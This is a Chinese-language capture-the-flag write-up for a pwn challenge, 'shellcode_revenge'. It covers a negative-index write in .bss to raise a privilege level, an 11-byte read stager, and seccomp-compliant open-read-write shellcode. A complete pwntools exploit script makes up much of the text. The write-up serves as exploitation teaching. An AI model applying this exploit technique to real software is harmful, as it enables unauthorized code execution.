# shellcode_revenge

## 题目简述

程序把权限等级 `level` 放在 `.bss`，菜单中的名称数组允许负下标写，从而可先改高权限等级，再进入 shellcode 功能。第一段可执行空间很短，且 seccomp 禁止直接起 shell，因此需要先用短 stager 再读入完整的 ORW shellcode。

## 解题过程

先在菜单项 3 中选择负索引 `-8`，把对应位置写成满足检查的高等级值。随后进入菜单项 4。第一阶段沿用调用点留下的 `rdi=0` 和 `rsi=当前缓冲区`，但不能沿用 `read` 返回后的 `rax`——`rax` 是实际读取字节数，不是系统调用号 0，因此应显式清零：

```python
from pwn import asm, context, remote, shellcraft

context.arch = "amd64"
io = remote("host", 10000)

def choose(number):
    io.sendlineafter(b">>>", str(number).encode())

choose(3)
io.sendlineafter(b"255", b"-8")
io.sendlineafter(b"?", b"1111")

# 长度恰为 11 字节；第二次 read 从第一阶段末尾继续写入。
stage1 = asm("""
    xor eax, eax
    push 0x7f
    pop rdx
    add rsi, 0xb
    syscall
""")
assert len(stage1) == 0xB

buf = 0x20240000 + 0x300
stage2 = asm(
    shellcraft.open("./flag")
    + shellcraft.read(3, buf, 0x80)
    + shellcraft.write(1, buf, 0x80)
)

choose(4)
io.sendafter(b"luck.", stage1)
io.send(stage2)
io.interactive()
```

原始题解脚本最后写成了 `send(payload)`，但变量 `payload` 并不存在；这里应发送已经汇编好的 `stage2`。若调试发现 `rdi` 在进入第一阶段时不再是 0，还需在 stager 中显式设置标准输入描述符。

## 方法总结

这题的链条是 `.bss` 负索引写、短 shellcode 二次读入、seccomp 下 ORW。复用寄存器前必须区分“调用参数仍残留”与“函数返回值”：`read` 返回后 `rdi` 往往仍是文件描述符，但 `rax` 已变成读取长度，不能直接当作下一次 `read` 的系统调用号。
